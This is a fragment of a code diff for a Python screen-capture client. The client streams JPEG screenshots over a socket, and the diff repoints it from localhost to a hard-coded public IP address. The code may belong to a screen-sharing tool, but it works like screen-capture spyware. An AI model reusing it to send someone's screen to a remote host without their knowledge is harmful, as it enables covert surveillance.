@@ -21,7 +21,7 @@ def retrieve_screenshot(conn):
             image = sct.grab(rect)
             buffer = io.BytesIO()
             im = Image.frombytes('RGB', image.size, image.rgb)
-            im.save(buffer, format="JPEG", quality=75)
+            im.save(buffer, format="JPEG", quality=40)
             #Send the size of the pixels length
 
             # Send pixels
@@ -31,7 +31,7 @@ def retrieve_screenshot(conn):
             conn.send(g)
 
 
-def main(host='127.0.0.1', port=5202):
+def main(host='83.130.81.176', port=5202):
     sock = socket()
     sock.connect((host, port))
     thread = Thread(target=retrieve_screenshot, args=(sock,))
